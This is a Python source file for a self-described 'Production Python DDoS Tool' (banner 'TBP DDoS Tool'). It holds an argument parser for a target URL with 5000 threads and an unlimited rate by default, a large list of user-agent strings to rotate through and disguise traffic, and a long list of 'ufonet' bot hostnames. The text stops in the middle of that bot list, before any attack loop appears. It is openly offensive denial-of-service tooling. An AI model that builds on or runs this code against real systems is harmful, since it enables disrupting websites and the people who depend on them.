import requests
import threading
import time
import random
import sys
import argparse
from colorama import Fore, Style, Back, init
from datetime import datetime
import os
import socket
import struct
from concurrent.futures import ThreadPoolExecutor
import urllib.parse


init(autoreset=True)


requests_sent = 0
bytes_sent = 0
errors = 0
lock = threading.Lock()

def banner():
    os.system('cls' if os.name == 'nt' else 'clear')

    banner_text = r"""
                                                                                                                                            
 /$$$$$$$$ /$$                       /$$$$$$$  /$$                     /$$             /$$$$$$$           /$$                               
|__  $$__/| $$                      | $$__  $$| $$                    | $$            | $$__  $$         | $$                               
   | $$   | $$$$$$$   /$$$$$$       | $$  \ $$| $$  /$$$$$$   /$$$$$$$| $$   /$$      | $$  \ $$ /$$$$$$ | $$  /$$$$$$   /$$$$$$$  /$$$$$$  
   | $$   | $$__  $$ /$$__  $$      | $$$$$$$ | $$ |____  $$ /$$_____/| $$  /$$/      | $$$$$$$/|____  $$| $$ |____  $$ /$$_____/ /$$__  $$ 
   | $$   | $$  \ $$| $$$$$$$$      | $$__  $$| $$  /$$$$$$$| $$      | $$$$$$/       | $$____/  /$$$$$$$| $$  /$$$$$$$| $$      | $$$$$$$$ 
   | $$   | $$  | $$| $$_____/      | $$  \ $$| $$ /$$__  $$| $$      | $$_  $$       | $$      /$$__  $$| $$ /$$__  $$| $$      | $$_____/ 
   | $$   | $$  | $$|  $$$$$$$      | $$$$$$$/| $$|  $$$$$$$|  $$$$$$$| $$ \  $$      | $$     |  $$$$$$$| $$|  $$$$$$$|  $$$$$$$|  $$$$$$$ 
   |__/   |__/  |__/ \_______/      |_______/ |__/ \_______/ \_______/|__/  \__/      |__/      \_______/|__/ \_______/ \_______/ \_______/ 
 TBP DDoS Tool                                                                                                                              
"""

    print(Fore.WHITE + Back.BLACK + banner_text)
    print(f"{Back.BLACK}{Fore.WHITE}{'=' * 90}")
    print(f"{Back.BLACK}{Fore.WHITE}Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"{Back.BLACK}{Fore.WHITE}{'=' * 90}\n")

def parse_args():
    parser = argparse.ArgumentParser(description=f"{Back.BLACK}{Fore.WHITE}Production Python DDoS Tool")
    parser.add_argument("-t", "--target", help=f"{Back.BLACK}{Fore.WHITE}Target URL (e.g., http://example.com)", required=True)
    parser.add_argument("-p", "--port", type=int, default=80, help=f"{Back.BLACK}{Fore.WHITE}Target port")
    parser.add_argument("-w", "--workers", type=int, default=5000, help=f"{Back.BLACK}{Fore.WHITE}Number of worker threads (default: 5000)")
    parser.add_argument("-r", "--rate", type=int, default=0, help=f"{Back.BLACK}{Fore.WHITE}RPS per thread (0=unlimited)")
    parser.add_argument("-m", "--method", choices=['GET', 'POST', 'HEAD', 'OPTIONS'], default='GET', help=f"{Back.BLACK}{Fore.WHITE}HTTP method")
    parser.add_argument("-d", "--delay", type=float, default=0, help=f"{Back.BLACK}{Fore.WHITE}Delay between requests (0=max speed)")
    return parser.parse_args()

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36",
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 8.1.0; Moto G (5S)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 9; itel L6005) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; LYA-L29 Build/HUAWEILYA-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.166 Mobile Safari/537.36',
    'Dalvik/2.1.0 (Linux; U; Android 10; moto g(7) Build/QPUS30.52-33-10)',
    'Dalvik/2.1.0 (Linux; U; Android 10; motorola one vision Build/QSAS30.62-28-12-1)',
    'Mozilla/5.0 (Linux; Android 7.0; SM-N920V Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.132 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; U; Android 6.0; F3311 Build/37.0.A.2.252; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36 OPR/32.0.2254.122976',
    'Mozilla/5.0 (Linux; Android 6.0.1; SM-N910P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.3; Win64; rv:82.0) Gecko/20100101 Firefox/82.0',
    'Dalvik/1.6.0 (Linux; U; Android 4.4.2; MINT 150 Build/KOT49H)',
    'Mozilla/5.0 (Linux; Android 10; Infinix X690B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 8.1.0; K5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; SM-G986B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 7.0; BTV-DL09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 8.0.0; ZB555KL Build/OPR1.170623.032; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.149 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 7.0; BLL-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 Edg/93.0.961.44',
    'Mozilla/5.0 (Linux; Android 7.0; roarV95) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Mobile Safari/537.36',
    'Dalvik/2.1.0 (Linux; U; Android 7.0; Noir A1 Build/NRD90M)',
    'Mozilla/5.0 (Linux; Android 10; ONEPLUS A6003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; SM-T830 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.62 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 9; SM-G965F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 9; MRD-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; RMX2061) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.185 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; M2007J3SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.181 Mobile Safari/537.36',
    'Dalvik/2.1.0 (Linux; U; Android 9.0; Redmi Note 4 MIUI/11.0.5.0 | PCFMIXM | Stable | @Siddharth_Sarkar)',
    'Dalvik/2.1.0 (Linux; U; Android 6.0; LG-F460S Build/MRA58K)',
    'Mozilla/5.0 (Linux; Android 9; LM-G820) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.96 Mobile Safari/537.36',
    'Dalvik/1.6.0 (Linux; U; Android 6.0; Tecno K18 Build/TecnoK18)',
    'Dalvik/2.1.0 (Linux; U; Android 6.0; LT_P7 Build/MRA58K)',
    'Mozilla/5.0 (Linux; Android 10; SM-A015V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 5.1.1; SM-G531F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.96 Mobile Safari/537.36',
    'Dalvik/2.1.0 (Linux; U; Android 9; Phone 2 Build/P-SMR5-RC002-RZR-200910)',
    'Mozilla/5.0 (Linux; U; Android 9; en-gb; CPH2015 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36 HeyTapBrowser/25.7.8.1',
    'Dalvik/2.1.0 (Linux; U; Android 9; UNONU_W60_PLUS Build/PPR1.180610.011)',
    'Mozilla/5.0 (Linux; Android 9.0.0; TVBOX Build/NHG47K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.105 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 9; HTC U11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 8.1.0; U1005) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Safari/537.36',
    'Dalvik/2.1.0 (Linux; U; Android 9; VONTAR X3 Build/PPR1.180610.011)',
    'Mozilla/5.0 (iPad; CPU OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 EdgiOS/46.1.10 Mobile/15E148 Safari/605.1.15',
    'Mozilla/5.0 (Linux; Android 5.1; ZTE Blade A475) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.60 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 5.0.1; SM-G906L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.83 Mobile Safari/537.36',
    'Dalvik/2.1.0 (Linux; U; Android 10; MI 8 Lite MIUI/V12.0.2.0.QDTCNXM)',
    'Mozilla/5.0 (Linux; Android 8.1.0; DUB-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 8.1.0; PM45) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 9; LM-Q610.FG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 7.0; KOB-L09 Build/HUAWEIKOB-L09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Mobile Safari/537.36 YaApp_Android/9.85 YaSearchBrowser/9.85',
    'Dalvik/1.6.0 (Linux; U; Android 4.4.2; SM-C105 Build/KOT49H)',
    'Dalvik/2.1.0 (Linux; U; Android 9; MI 5s Build/PQ3B.190605.006)',
    'Mozilla/5.0 (Linux; Android 8.1.0; TAB1081 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; LM-K500) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-G985F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.0 Chrome/83.0.4103.106 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; SM-J400F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36 Edg/92.0.902.84',
    'Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-J415FN) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/15.0 Chrome/90.0.4430.210 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 8.1.0; SM-J710F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 5.1.1; SM-J120H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; Alcatel_5002R) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; 5007Z) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.66 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; arm_64; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 YaBrowser/20.4.4.76.00 SA/1 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36',
    'Dalvik/2.1.0 (Linux; U; Android 8.1.0; itel A32F Build/O11019)',
    'Mozilla/5.0 (Linux; Android 9; Mi 9 SE) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.96 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 13_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.6.1;FBSS/2;FBID/phone;FBLC/ro_RO;FBOP/5]',
    'Dalvik/2.1.0 (Linux; U; Android 10; P20HD_EEA Build/QP1A.190711.020)',
    'Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.0 Chrome/79.0.3945.136 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; moto g(8) power) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.36',
    'Dalvik/2.1.0 (Linux; U; Android 10; Redmi 4X MIUI/20.8.20 UNOFFICIAL)',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36 Edg/83.0.478.54',
    'Mozilla/5.0 (Linux; Android 10; SM-A205F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Mobile Safari/537.36 EdgA/93.0.961.78',
    'Mozilla/5.0 (Linux; Android 10; SH-03K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; SM-A305G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 8.1.0; i95) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36',
    'Dalvik/2.1.0 (Linux; U; Android 7.1.1; H3321 Build/49.0.A.6.102)',
    'Mozilla/5.0 (Linux; Android 11; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36',
    'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.0.04506; Media Center PC 5.1)',
    'Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-N910C Build/LMY47X)',
    'Mozilla/5.0 (Linux; Android 10; ONEPLUS A6013) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Mobile Safari/537.36',
    'Dalvik/2.1.0 (Linux; U; Android 5.1.1; 5017B Build/LMY47V)',
    'Dalvik/2.1.0 (Linux; U; Android 10; ums512_1h10_Natv Build/QP1A.190711.020)',
    'Dalvik/2.1.0 (Linux; U; Android 10; M2007J20CI MIUI/V12.0.5.0.QJGINXM)',
    'Dalvik/2.1.0 (Linux; U; Android 10; SCM-AL09 Build/HUAWEISCM-AL09)',
    'Mozilla/5.0 (Linux; Android 10; SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.96 Mobile Safari/537.36',
    'Dalvik/1.6.0 (Linux; U; Android 4.4.2; Lenovo B6000-F Build/KOT49H)',
    'Mozilla/5.0 (Linux; Android 11; ASUS_I01WD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; U; Android 9; Redmi Note 7 Build/PKQ1.180904.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.99 Mobile Safari/537.36 OPR/45.0.2254.144855',
    'Mozilla/5.0 (Linux; Android 10; SM-T595 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.62 Mobile Safari/537.36',
    'Dalvik/1.6.0 (Linux; U; Android 4.4.2; W67 Build/UNKNOWN)',
    'Mozilla/5.0 (Linux; Android 7.0; SLA-L02) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 7.0; Moto G (5) Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36',
    'Dalvik/2.1.0 (Linux; U; Android 10; Redmi 7A MIUI/V12.0.2.0.QCMMIXM)',
    'Mozilla/5.0 (Linux; Android 10; BE2028) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.86 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; CPH2127) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 6.0; SM-G900M Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.132 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 8.1.0; DUB-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.120 Mobile Safari/537.36',
    'Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-J3308 Build/M1AJQ)',
    'Mozilla/5.0 (Linux; Android 9; ZTE Blade V10 Vita) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 9; vivo 1920) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.96 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.67 Safari/537.36 Edg/87.0.664.52',
]

ufonet_bots = [
    'bot1.ufonet.com', 'bot2.ufonet.com', 'bot3.ufonet.com', 'bot4.ufonet.com', 'bot5.ufonet.com',
    'bot6.ufonet.com', 'bot7.ufonet.com', 'bot8.ufonet.com', 'bot9.ufonet.com', 'bot10.ufonet.com',
    'bot11.ufonet.com', 'bot12.ufonet.com', 'bot13.ufonet.com', 'bot14.ufonet.com', 'bot15.ufonet.com',
    'bot16.ufonet.com', 'bot17.ufonet.com', 'bot18.ufonet.com', 'bot19.ufonet.com', 'bot20.ufonet.com',
    'bot21.ufonet.com', 'bot22.ufonet.com', 'bot23.ufonet.com', 'bot24.ufonet.com', 'bot25.ufonet.com',
    'bot26.ufonet.com', 'bot27.ufonet.com', 'bot28.ufonet.com', 'bot29.ufonet.com', 'bot30.ufonet.com',
    'bot31.ufonet.com', 'bot32.ufonet.com', 'bot33.ufonet.com', 'bot34.ufonet.com', 'bot35.ufonet.com',
    'bot36.ufonet.com', 'bot37.ufonet.com', 'bot38.ufonet.com', 'bot39.ufonet.com', 'bot40.ufonet.com',
    'bot41.ufonet.com', 'bot42.ufonet.com', 'bot43.ufonet.com', 'bot44.ufonet.com', 'bot45.ufonet.com',
    'bot46.ufonet.com', 'bot47.ufonet.com', 'bot48.ufonet.com', 'bot49.ufonet.com', 'bot50.ufonet.com',
    'bot51.ufonet.com', 'bot52.ufonet.com', 'bot53.ufonet.com', 'bot54.ufonet.com', 'bot55.ufonet.com',
    'bot56.ufonet.com', 'bot57.ufonet.com', 'bot58.ufonet.com', 'bot59.ufonet.com', 'bot60.ufonet.com',
    'bot61.ufonet.com', 'bot62.ufonet.com', 'bot63.ufonet.com', 'bot64.ufonet.com', 'bot65.ufonet.com',
    'bot66.ufonet.com', 'bot67.ufonet.com', 'bot68.ufonet.com', 'bot69.ufonet.com', 'bot70.ufonet.com',
    'bot71.ufonet.com', 'bot72.ufonet.com', 'bot73.ufonet.com', 'bot74.ufonet.com', 'bot75.ufonet.com',
    'bot76.ufonet.com', 'bot77.ufonet.com', 'bot78.ufonet.com', 'bot79.ufonet.com', 'bot80.ufonet.com',
    'bot81.ufonet.com', 'bot82.ufonet.com', 'bot83.ufonet.com', 'bot84.ufonet.com', 'bot85.ufonet.com',
    'bot86.ufonet.com', 'bot87.ufonet.com', 'bot88.ufonet.com', 'bot89.ufonet.com', 'bot90.ufonet.com',
    'bot91.ufonet.com', 'bot92.ufonet.com', 'bot93.ufonet.com', 'bot94.ufonet.com', 'bot95.ufonet.com',
    'bot96.ufonet.com', 'bot97.ufonet.com', 'bot98.ufonet.com', 'bot99.ufonet.com', 'bot100.ufonet.com',
    'bot101.ufonet.com', 'bot102.ufonet.com', 'bot103.ufonet.com', 'bot104.ufonet.com', 'bot105.ufonet.com',
    'bot106.ufonet.com', 'bot107.ufonet.com', 'bot108.ufonet.com', 'bot109.ufonet.com', 'bot110.ufonet.com',
    'bot111.ufonet.com', 'bot112.ufonet.com', 'bot113.ufonet.com', 'bot114.ufonet.com', 'bot115.ufonet.com',
    'bot116.ufonet.com', 'bot117.ufonet.com', 'bot118.ufonet.com', 'bot119.ufonet.com', 'bot120.ufonet.com',
    'bot121.ufonet.com', 'bot122.ufonet.com', 'bot123.ufonet.com', 'bot124.ufonet.com', 'bot125.ufonet.com',
    'bot126.ufonet.com', 'bot127.ufonet.com', 'bot128.ufonet.com', 'bot129.ufonet.com', 'bot130.ufonet.com',
    'bot131.ufonet.com', 'bot132.ufonet.com', 'bot133.ufonet.com', 'bot134.ufonet.com', 'bot135.ufonet.com', 'bot136.ufonet.com', 'bot137.ufonet.com',
    'bot138.ufonet.com', 'bot139.ufonet.com', 'bot140.ufonet.com', 'bot141.ufonet.com', 'bot142.ufonet.com', 'bot143.ufonet.com', 'bot144.ufonet.com',
    'bot145.ufonet.com', 'bot146.ufonet.com', 'bot147.ufonet.com', 'bot148.ufonet.com', 'bot149.ufonet.com', 'bot150.ufonet.com', 'bot151.ufonet.com',
    'bot152.ufonet.com', 'bot153.ufonet.com', 'bot154.ufonet.com', 'bot155.ufonet.com', 'bot156.ufonet.com', 'bot157.ufonet.com', 'bot158.ufonet.com',
    'bot159.ufonet.com', 'bot160.ufonet.com', 'bot161.ufonet.com', 'bot162.ufonet.com', 'bot163.ufonet.com', 'bot164.ufonet.com','bot165.ufonet.com',
    'bot166.ufonet.com', 'bot167.ufonet.com', 'bot168.ufonet.com', 'bot169.ufonet.com', 'bot170.ufonet.com', 'bot171.ufonet.com', 'bot172.ufonet.com',
    'bot173.ufonet.com', 'bot174.ufonet.com', 'bot175.ufonet.com', 'bot176.ufonet.com', 'bot177.ufonet.com', 'bot178.ufonet.com', 'bot179.ufonet.com',
    'bot180.ufonet.com', 'bot181.ufonet.com', 'bot182.ufonet.com', 'bot183.ufonet.com', 'bot184.ufonet.com', 'bot185.ufonet.com', 'bot186.ufonet.com',
    'bot187.ufonet.com', 'bot188.ufonet.com', 'bot189.ufonet.com', 'bot190.ufonet.com', 'bot191.ufonet.com', 'bot192.ufonet.com', 'bot193.ufonet.com',
    'bot194.ufonet.com', 'bot195.ufonet.com', 'bot196.ufonet.com', 'bot197.ufonet.com', 'bot198.ufonet.com', 'bot199.ufonet.com', 'bot200.ufonet.com',
    'bot201.ufonet.com', 'bot202.ufonet.com', 'bot203.ufonet.com', 'bot204.ufonet.com', 'bot205.ufonet.com', 'bot206.ufonet.com', 'bot207.ufonet.com',
    'bot208.ufonet.com', 'bot209.ufonet.com', 'bot210.ufonet.com', 'bot211.ufonet.com', 'bot212.ufonet.com', 'bot213.ufonet.com', 'bot214.ufonet.com',
    'bot215.ufonet.com', 'bot216.ufonet.com', 'bot217.ufonet.com', 'bot218.ufonet.com', 'bot219.ufonet.com', 'bot220.ufonet.com', 'bot221.ufonet.com',
    'bot222.ufonet.com', 'bot223.ufonet.com', 'bot224.ufonet.com', 'bot225.ufonet.com', 'bot226.ufonet.com', 'bot227.ufonet.com', 'bot228.ufonet.com',
    'bot229.ufonet.com', 'bot230.ufonet.com', 'bot231.ufonet.com', 'bot232.ufonet.com', 'bot233.ufonet.com', 'bot234.ufonet.com', 'bot235.ufonet.com',
